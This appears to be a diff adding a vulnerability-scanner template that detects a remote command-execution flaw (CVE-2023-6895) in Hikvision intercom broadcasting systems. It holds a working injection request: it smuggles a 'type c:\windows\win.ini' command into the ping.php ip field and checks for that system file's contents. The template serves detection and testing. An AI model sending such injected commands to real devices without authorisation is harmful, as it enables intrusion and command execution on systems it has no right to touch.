@@ -1,0 +1,28 @@
+id: hikvision-ip-network-intercom-rce
+info:
+  name: Hikvision IP Network Intercom Broadcasting System Remote Command Execution (CVE-2023-6895)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,CVE-2023-6895
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/php/ping.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: "jsondata%5Btype%5D=99&jsondata%5Bip%5D=type c:\\windows\\win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[fonts]"
+          - "[files]"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
